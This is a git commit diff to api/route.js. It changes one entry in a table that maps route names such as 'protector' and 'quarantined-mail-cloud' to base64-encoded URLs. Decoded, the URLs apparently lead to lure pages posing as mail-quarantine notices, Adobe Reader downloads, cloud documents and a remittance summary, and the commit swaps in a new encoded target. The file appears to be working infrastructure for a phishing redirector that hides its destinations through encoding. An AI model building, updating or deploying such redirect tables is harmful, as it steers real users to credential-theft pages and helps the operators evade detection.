22d4a08ae099007c8adfc18df7ae2bdfaac6619a
burgher15 <146773615+burgher15@users.noreply.github.com>
2026-08-20 22:22:29 +0100

    Update route.js

--- api/route.js
+++ api/route.js
@@ -14,7 +14,7 @@ export async function GET(request) {
     "mylinprotect.vercel.app": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
     "protecteds": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
     "biss": "aHR0cHM6Ly9jZXR2b3JhLnZ1L0Fkb2JlZXJlYWRlcg==",
-    "craine": "aHR0cHM6Ly9oZWp2Y3JvLnZ1L2Fkb2JlcmVhZHM=",
+    "craine": "aHR0cHM6Ly9jbG91ZGRvY3NldnIudG9wPzBmbWNobzcyb2c9WjJWeGFXZHo=",
     "protector": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
     "quarantined-mail-cloud": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
     "vm": "aHR0cHM6Ly9yZW1pdHRhbmNlLXN1bW1hcnktMDgwOTIwMjYtZHBha2kub25kaWdpdGFsb2NlYW4uYXBwLw==",
